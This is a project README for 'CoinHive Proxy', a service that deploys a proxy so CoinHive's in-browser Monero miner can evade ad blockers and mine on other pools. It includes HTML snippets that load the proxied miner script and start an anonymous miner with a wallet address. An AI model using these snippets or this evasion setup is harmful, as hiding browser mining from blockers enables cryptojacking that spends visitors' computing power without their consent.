CoinHive Proxy 🎉
----------------

[This website](https://coinhive-proxy.party) allows you to create your own proxy for [coinhive.com](https://coinhive.com).

This way you can avoid being blocked by an **AdBlock**.

It uses [coin-hive-stratum](https://github.com/cazala/coin-hive-stratum) under the hood and deploys the proxy instance to [zeit.co/now](https://zeit.co/now).

With this proxy you can also mine on a **different pool** than CoinHive's, with a different **commision** and **difficulty**.

Once your proxy is created, you just have to replace CoinHive's miner url with **your proxy url**.

Go ahead and [create your proxy in a few seconds](https://coinhive-proxy.party)!

## Instructions

##### 1. Select a pool

Go to [CoinHive Proxy](https://coinhive-proxy.party) and select a pool.

You can make your proxy point to CoinHive, or to a different pool.

The other pools have different **commisions** and **difficulties** than CoinHive.

Once you selected the pool you want to use, click on `Get your proxy`.

##### 2. Deploy your proxy

Enter your email address and click on `Deploy to ▲ Z E I T`.

This will send you an email confirmation.

Don't worry if you don't have a **▲ Z E I T** account, they will create on for you.

Once you confirm your email, your proxy will be deployed.

##### 3. Use your proxy

Once your proxy is deployed, you will get **your proxy url** and a **snippet** that you will need to use to replace CoinHive's miner url.

Replace this:

```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
```

With this:

```html
<script src="THIS-IS-YOUR-PROXY.now.sh/client?proxy"></script>
```

You can now keep using CoinHive's JavaScript Miner without worrying about AdBlock and/or mine on a different pool if you want. 


## Sources

All the UI sources have been uploaded to this repo, and the API endpoints are publicly hosted in [hook.io](https://hook.io)

- [/registration](https://hook.io/zeit/registration/source)

- [/verify](https://hook.io/zeit/verify/source)

- [/deploy](https://hook.io/zeit/deploy/source)

- [/status](https://hook.io/zeit/status/source)

## FAQ

#### How can I manage my proxy?

Once your proxy is deployed, just go to [zeit.co/dashboard](https://zeit.co/dashboard). Make sure you sign in using the same email you used to deploy your proxy.

#### Can I change my proxy's domain?

Yes, fist install `now`

```
npm i -g now
```

Then login using the same email you used to deploy your proxy

```
now login
```

Finally just use `now alias` to change your proxy's domain

```
now alias proxy-khlizaweshj.now.sh my-awesome-proxy
```

Now your proxy's url will be `my-awesome-proxy.now.sh`

If you want to have your own domain, you can do so as well

```
now alias proxy-khlizawelj.now.sh my-awesome-proxy.com
```

Now your proxy's url will be `my-awesome-proxy.com`, but you will have to pay for it via [zeit.co/domains](https://zeit.co/domains)

#### Can I scale my proxy?

When you deploy your proxy it will get assigned 1 instance. This is for free.

If you get a [paid plan](https://zeit.co/pricing) you can use `now scale` to increase the number of instances

```
now scale proxy-khlizaweshj.now.sh 3
```

Now your proxy would be running on 3 instances. To learn more about scaling [read this](https://zeit.co/docs/getting-started/scaling).

#### Are you going to steal my access token?

No, I promise. If it makes you feel safer go ahead and look at the [sources](https://github.com/coin-hive-proxy-party/coin-hive-proxy-party.github.io#sources) of the only 4 endpoints. 

You will see those endpoints just forward the tokens to Zeit's API, I don't store them anywhere :)

#### I'm getting an `invalid_site_key` error on the console when I try to use the proxy, why?

That's probably because you created a proxy to a different pool than CoinHive, and you are creating your miner using your CoinHive Site Key

When you use the proxy to mine on a different pool than CoinHive you have to provide your Monero Wallet Address instead of your Site Key, like this:

```html
<script src="https://proxy-khlizaweshj.now.sh/client?proxy"></script>
<script>
  var miner = new CoinHive.Anonymous('YOUR_MONERO_ADDRESS');
  miner.start();
</script>
```

If you don't have a Monero Wallet, you can get one on [mymonero.com](https://mymonero.com)

#### I'm getting an `internal_server_error` when I try to deploy my proxy, why?

This is probably because you run out of free instances on your Zeit account. The free plan allows you to have a maximum of 3 running instances. If you need more, you can always [upgrade your plan](https://zeit.co/pricing).
